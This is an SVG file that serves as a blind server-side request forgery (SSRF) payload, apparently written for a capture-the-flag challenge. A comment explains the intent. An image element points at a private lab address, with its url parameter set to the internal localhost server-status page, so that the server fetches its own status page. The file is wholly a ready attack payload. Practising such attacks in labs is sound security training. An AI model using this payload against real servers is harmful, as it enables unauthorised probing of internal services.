<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <!--     This payload attempts a "blind" SSRF attack.    It tells the browser to load an image. The URL for that image points back     to the main challenge site, but with the 'url' parameter set to the internal     server-status page.    If the server is vulnerable, it will fetch its own status page.    We won't see the result directly, but this might be what the challenge expects.  -->
    <image xlink:href="http://10.129.246.228/?url=http://localhost/server-status" width="200" height="200" /></svg>
SVG namespace
 
